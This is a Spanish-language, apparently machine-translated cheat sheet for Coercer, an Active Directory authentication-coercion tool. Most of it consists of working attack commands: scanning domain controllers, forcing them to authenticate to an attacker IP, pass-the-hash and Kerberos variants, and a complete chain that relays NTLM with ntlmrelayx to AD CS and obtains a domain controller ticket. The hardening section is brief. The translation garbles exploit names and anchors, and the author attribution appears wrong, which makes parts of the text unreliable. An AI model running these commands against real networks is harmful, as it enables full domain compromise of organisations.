<!-- language-home-navigation -->
[🏠 Página Principal Española](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🪓 Coercer - Hoja de referencia completa

[🇹🇷 Türkçe Sürüm](traducciones/README.tr.md)
```
   ██████╗ ██████╗ ███████╗██████╗  ██████╗███████╗██████╗ 
  ██╔════╝██╔═══██╗██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗
  ██║     ██║   ██║█████╗  ██████╔╝██║     █████╗  ██████╔╝
  ██║     ██║   ██║██╔══╝  ██╔══██╗██║     ██╔══╝  ██╔══██╗
  ╚██████╗╚██████╔╝███████╗██║  ██║╚██████╗███████╗██║  ██║
   ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝  ╚═╝
       Active Directory Multi-Protocol Windows Authentication Coercion Engine
```
<p align="centro">
  <img src="https://img.shields.io/badge/Coercer-RPC_Coercion-blue?style=for-the-badge" alt="Coercer">
  <img src="https://img.shields.io/badge/Author-p0dalirius-orange?style=for-the-badge" alt="p0dalirius">
  <img src="https://img.shields.io/badge/Category-Active_Directory_&_Network-green?style=for-the-badge" alt="Active Directory">
  <img src="https://img.shields.io/badge/License-GPLv3-red?style=for-the-badge" alt="Licencia GPLv3">
</p>

<p align="centro">
  <b>🌐 Escanee, detecte y coaccione automáticamente servidores Windows y controladores de dominio para que se autentiquen en máquinas arbitrarias a través de más de 12 protocolos RPC</b>
</p>

---

## 📋 Tabla de contenidos

- [Descripción general y primitiva de coerción de autenticación](#-descripción general--la-primitiva-de-coerción-de-autenticación)
- [Protocolos y métodos RPC admitidos] (#-protocolos-rpc-compatibles--métodos)
- [Instalación](#-instalación)
- [Buscando interfaces RPC vulnerables (`scan`)](#-scanning-for-vulnerable-rpc-interfaces-scan)
- [Ejecutando coerción de autenticación (`coerce`)](#-ejecutando-autenticación-coerción-coerce)
- [La cadena de ataque completa: Coerción -> Retransmisión NTLM -> AD CS ESC8](#-la-coerción-de-cadena-de-ataque-completa---retransmisión-ntlm---ad-cs-esc8)
- [Filtrado de protocolos y métodos](#-protocolo--filtrado de métodos)
- [Soporte para Kerberos y Pass-the-Hash](#-kerberos--pass-the-hash-support)
- [Tabla de referencia rápida](#-tabla-de-referencia-rápida)
- [Consideraciones defensivas y endurecimiento](#-consideraciones-defensivas--endurecimiento)
- [Aviso legal](#-aviso-legal)

---

## 🎯 Descripción general y primitiva de coerción de autenticación

En entornos de Active Directory, la **coerción de autenticación** es una primitiva ofensiva devastadora. Explota las interfaces RPC heredadas implementadas en los servicios de Windows que permiten a un usuario autenticado solicitar a una máquina remota (como un controlador de dominio) que se conecte a una ruta UNC designada (`\\attacker\share`).

Cuando la máquina remota de Windows se conecta a la máquina controlada por el atacante, inicia la **autenticación NTLM de cuenta de máquina** (`DC01$`). 

Al capturar o transmitir esta credencial de cuenta de máquina mediante `ntlmrelayx` a los Servicios de certificados de Active Directory (inscripción web de AD CS - ESC8) o a objetivos de delegación sin restricciones, los atacantes pueden lograr **un compromiso completo e inmediato del dominio**.

Escrito por **Clément Notin (p0dalirius)**, **Coercer** unifica más de una docena de exploits de coerción individuales (PetitPotam, PrinterBug, ShadowCoerce, DFSCoerce) en un marco único, automatizado y altamente modular.

---

## 🔌 Protocolos y métodos RPC compatibles

Coercer prueba y explota las siguientes interfaces RPC:

| Nombre del protocolo | Nombre de explotación común | Tubería/Interfaz |
|--------------|---------------------|------------------|
| **MS-EFSRPC** | Petit Potam | `\pipe\efsrpc`, `\pipe\lsarpc` |
| **MS-RPRN** | PrinterBug / SpoolSample | `\pipe\spoolss` |
| **MS-FSRVP** | Coerción de las sombras | `\pipe\FSRVP` |
| **MS-DFSNM** | DFSCoercia | `\pipe\netdfs` |
| **MS-PAN** | ImprimirPesadilla adyacente | Administración de impresión remota |
| **MS-SAMR** | Queso | Gerente de cuentas de seguridad |

---

## 📥 Instalación
```bash
# Install via pipx (Recommended)
pipx install coercer

# Or via standard pip
pip3 install coercer

# From GitHub source
git clone https://github.com/p0dalirius/Coercer.git
cd Coercer
pip3 install -r requirements.txt
python3 Coercer.py --help
```
---

## 🔍 Escaneo en busca de interfaces RPC vulnerables (`scan`)

Antes de activar la coerción, escanee de forma segura los controladores de dominio de destino para descubrir qué funciones RPC están habilitadas y accesibles:
```bash
# Scan a single Domain Controller
coercer scan -u 'testuser' -p 'Password123' -d 'corp.local' -t 10.10.10.1

# Scan an entire range of Domain Controllers
coercer scan -u 'testuser' -p 'Password123' -d 'corp.local' --targets-file dcs.txt
```
---

## ⚡ Ejecutando coerción de autenticación (`coerce`)

Active una conexión NTLM de cuenta de máquina saliente desde el DC de destino a su oyente:
```bash
# Coerce DC (10.10.10.1) to authenticate to attacker machine (10.10.14.5)
coercer coerce -u 'testuser' -p 'Password123' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5
```
---

## 💥 La cadena de ataque completa: Coerción -> Retransmisión NTLM -> AD CS ESC8

El vector canónico de escalada de dominio:
```bash
# 1. Start ntlmrelayx targeting the vulnerable AD CS Web Enrollment HTTP endpoint
impacket-ntlmrelayx -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# 2. Trigger authentication coercion using Coercer
coercer coerce -u 'lowuser' -p 'Pass123' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5

# 3. ntlmrelayx receives DC01$ authentication and generates a base64 certificate!

# 4. Request a full Domain Admin Kerberos TGT using gettgtpkinit (PKINITtools)
gettgtpkinit.py corp.local/DC01\$ -pfx-base64 <BASE64_CERT> dc01.ccache
```
---

## 🎯 Filtrado de protocolos y métodos

Apunte a un método específico sin enviar spam a todo el espectro RPC:
```bash
# Coerce using ONLY PetitPotam (MS-EFSRPC)
coercer coerce -u 'user' -p 'pass' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5 --filter-protocol-name MS-EFSRPC

# Coerce using ONLY PrinterBug (MS-RPRN)
coercer coerce -u 'user' -p 'pass' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5 --filter-protocol-name MS-RPRN
```
---

## 🔑 Soporte para Kerberos y Pass-the-Hash
```bash
# Authenticate using NTLM Hash (Pass-the-Hash)
coercer coerce -u 'user' --hashes :aad3b435b51404eeaad3b435b51404ee:7fc508... -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5

# Authenticate using Kerberos Ticket (KRB5CCNAME)
export KRB5CCNAME=/tmp/user.ccache
coercer coerce -k -no-pass -d 'corp.local' -t dc01.corp.local -l 10.10.14.5
```
---

## ⚡ Tabla de referencia rápida

| Objetivo | Comando |
|-----------|------------------|
| **Escanee DC en busca de coerción** | `coercer scan -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP>` |
| **Forzar autenticación** | `coercer coerce -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP> -l <ATTACKER_IP>` |
| **Coaccionar a través de MS-EFSRPC** | `coercer coerce -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP> -l <IP> --filter-protocol-name MS-EFSRPC` |
| **Coaccionar a través de MS-RPRN** | `coercer coerce -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP> -l <IP> --filter-protocol-name MS-RPRN` |
| **Coerción de pasar el hachís** | `coercer coerce -u <USER> --hashes :<NTLM> -d <DOMAIN> -t <DC_IP> -l <IP>` |
| **Coerción de ticket Kerberos** | `coercer coerce -k -no-pass -d <DOMAIN> -t <DC_FQDN> -l <IP>` |

---

## 🛡️ Consideraciones defensivas y endurecimiento

1. **Deshabilitar la cola de impresión en los controladores de dominio:** El servicio de cola de impresión (`spoolsv.exe`) debe estar completamente deshabilitado en los controladores de dominio (`Stop-Service Spooler -Passthru; Set-Service Spooler -StartupType Disabled`).
2. **Habilite la protección extendida para la autenticación (EPA):** En servidores AD CS IIS, habilite EPA y requiera HTTPS para bloquear los ataques de retransmisión NTLM.
3. **Filtrado RPC y segmentación de red:** Restrinja el acceso al asignador de puntos finales RPC (puerto TCP 135) a subredes administrativas autorizadas.

---

## ⚠️ Aviso legal

> [!PRECAUCIÓN]
> Coercer activa llamadas de autenticación remota activa que pueden desestabilizar los servicios de dominio sin parches. Úselo exclusivamente durante pruebas de penetración autorizadas y con el consentimiento explícito del cliente.